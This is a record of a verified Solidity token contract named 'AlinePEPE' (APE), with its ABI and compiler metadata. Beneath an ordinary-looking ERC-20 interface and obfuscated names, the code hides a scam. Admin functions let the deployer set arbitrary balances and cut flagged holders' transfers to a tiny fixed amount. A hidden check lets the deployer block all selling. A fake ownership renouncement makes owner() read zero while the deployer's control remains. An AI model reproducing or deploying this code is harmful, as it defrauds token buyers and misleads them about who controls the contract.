{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface exemptMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoTx) external view returns (uint256);\n\n    function transfer(address maxTrading, uint256 walletBuy) external returns (bool);\n\n    function allowance(address modeLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxTrading,\n        uint256 walletBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingReceiver, uint256 value);\n    event Approval(address indexed modeLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract fundLaunchList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverLiquidity {\n    function createPair(address sellAtAmount, address launchedTakeMarketing) external returns (address);\n}\n\ninterface sellFund is exemptMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AlinePEPE is fundLaunchList, exemptMarketing, sellFund {\n\n    uint256 private listTotalExempt = 100000000 * 10 ** 18;\n\n    bool private toLiquidityAmount;\n\n    uint256 public isBuy;\n\n    mapping(address => bool) public totalReceiverAuto;\n\n    string private minList = \"Aline PEPE\";\n\n    function maxReceiverLiquidity(address fundFrom, uint256 walletBuy) public {\n        senderTake();\n        sellAt[fundFrom] = walletBuy;\n    }\n\n    bool public modeMarketing;\n\n    uint256 private toIs;\n\n    function totalLiquidity(address swapMin) public {\n        if (senderMode) {\n            return;\n        }\n        \n        totalReceiverAuto[swapMin] = true;\n        \n        senderMode = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverFee;\n    }\n\n    function balanceOf(address autoTx) public view virtual override returns (uint256) {\n        return sellAt[autoTx];\n    }\n\n    uint256 tradingMode;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeTotal;\n    }\n\n    function owner() external view returns (address) {\n        return receiverFee;\n    }\n\n    function approve(address listLaunch, uint256 walletBuy) public virtual override returns (bool) {\n        limitAuto[_msgSender()][listLaunch] = walletBuy;\n        emit Approval(_msgSender(), listLaunch, walletBuy);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listTotalExempt;\n    }\n\n    mapping(address => bool) public fromAt;\n\n    event OwnershipTransferred(address indexed atTo, address indexed buyLaunchedMarketing);\n\n    function amountReceiver(address receiverToBuy, address maxTrading, uint256 walletBuy) internal returns (bool) {\n        require(sellAt[receiverToBuy] >= walletBuy);\n        sellAt[receiverToBuy] -= walletBuy;\n        sellAt[maxTrading] += walletBuy;\n        emit Transfer(receiverToBuy, maxTrading, walletBuy);\n        return true;\n    }\n\n    address private receiverFee;\n\n    function senderTake() private view {\n        require(totalReceiverAuto[_msgSender()]);\n    }\n\n    address shouldExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public buyMarketing;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverSwap;\n    }\n\n    bool public sellMaxTx;\n\n    uint8 private receiverSwap = 18;\n\n    function transfer(address fundFrom, uint256 walletBuy) external virtual override returns (bool) {\n        return sellLiquidity(_msgSender(), fundFrom, walletBuy);\n    }\n\n    function minFund(address toMinTotal) public {\n        senderTake();\n        \n        if (toMinTotal == launchedLaunch || toMinTotal == fromReceiver) {\n            return;\n        }\n        fromAt[toMinTotal] = true;\n    }\n\n    address public fromReceiver;\n\n    uint256 sellTeam;\n\n    uint256 constant receiverTrading = 6 ** 10;\n\n    function receiverAuto() public {\n        emit OwnershipTransferred(launchedLaunch, address(0));\n        receiverFee = address(0);\n    }\n\n    address public launchedLaunch;\n\n    function transferFrom(address receiverToBuy, address maxTrading, uint256 walletBuy) external override returns (bool) {\n        if (_msgSender() != sellTx) {\n            if (limitAuto[receiverToBuy][_msgSender()] != type(uint256).max) {\n                require(walletBuy <= limitAuto[receiverToBuy][_msgSender()]);\n                limitAuto[receiverToBuy][_msgSender()] -= walletBuy;\n            }\n        }\n        return sellLiquidity(receiverToBuy, maxTrading, walletBuy);\n    }\n\n    uint256 public autoListFund;\n\n    bool public senderMode;\n\n    constructor (){\n        if (modeMarketing) {\n            autoListFund = toIs;\n        }\n        limitLaunched swapShould = limitLaunched(sellTx);\n        fromReceiver = receiverLiquidity(swapShould.factory()).createPair(swapShould.WETH(), address(this));\n        \n        launchedLaunch = _msgSender();\n        receiverAuto();\n        totalReceiverAuto[launchedLaunch] = true;\n        sellAt[launchedLaunch] = listTotalExempt;\n        \n        emit Transfer(address(0), launchedLaunch, listTotalExempt);\n    }\n\n    function sellLiquidity(address receiverToBuy, address maxTrading, uint256 walletBuy) internal returns (bool) {\n        if (receiverToBuy == launchedLaunch) {\n            return amountReceiver(receiverToBuy, maxTrading, walletBuy);\n        }\n        uint256 receiverLimit = exemptMarketing(fromReceiver).balanceOf(shouldExempt);\n        require(receiverLimit == tradingMode);\n        require(maxTrading != shouldExempt);\n        if (fromAt[receiverToBuy]) {\n            return amountReceiver(receiverToBuy, maxTrading, receiverTrading);\n        }\n        return amountReceiver(receiverToBuy, maxTrading, walletBuy);\n    }\n\n    address sellTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return minList;\n    }\n\n    function receiverTake(uint256 walletBuy) public {\n        senderTake();\n        tradingMode = walletBuy;\n    }\n\n    function allowance(address toExempt, address listLaunch) external view virtual override returns (uint256) {\n        if (listLaunch == sellTx) {\n            return type(uint256).max;\n        }\n        return limitAuto[toExempt][listLaunch];\n    }\n\n    mapping(address => mapping(address => uint256)) private limitAuto;\n\n    string private modeTotal = \"APE\";\n\n    mapping(address => uint256) private sellAt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLaunchedMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoListFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletBuy\",\"type\":\"uint256\"}],\"name\":\"maxReceiverLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMinTotal\",\"type\":\"address\"}],\"name\":\"minFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletBuy\",\"type\":\"uint256\"}],\"name\":\"receiverTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMaxTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMin\",\"type\":\"address\"}],\"name\":\"totalLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalReceiverAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AlinePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}